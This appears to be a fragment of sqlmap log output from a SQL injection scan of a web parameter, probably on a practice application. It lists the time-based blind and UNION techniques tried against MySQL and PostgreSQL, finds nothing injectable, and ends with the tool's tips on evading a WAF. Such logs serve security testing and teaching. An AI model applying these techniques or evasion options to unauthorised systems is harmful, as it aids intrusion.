+[08:26:46] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
+[08:26:54] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
+[08:27:02] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
+[08:27:10] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[08:27:21] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
+[08:27:28] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[08:27:39] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
+[08:27:46] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[08:27:58] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[08:28:10] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[08:28:19] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
+[08:28:29] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[08:28:42] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
+[08:28:54] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
+[08:29:03] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
+[08:29:12] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
+[08:29:24] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
+[08:29:37] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
+[08:29:47] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
+[08:29:54] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                                        
+[08:30:04] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                              
+[08:30:09] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[08:30:10] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[08:30:10] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
+[08:30:11] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'                                                                                           
+[08:30:22] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
+[08:30:22] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
+[08:30:23] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
+[08:30:23] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
+[08:30:23] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
+[08:30:24] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[08:30:24] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'                                                                                               
+[08:30:25] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
+[08:30:26] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
+[08:30:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[08:30:28] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[08:30:46] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
+[08:31:03] [WARNING] GET parameter 'user-info-php-submit-button' does not seem to be injectable
+[08:31:03] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+
+[*] ending @ 08:31:03 /2022-04-15/
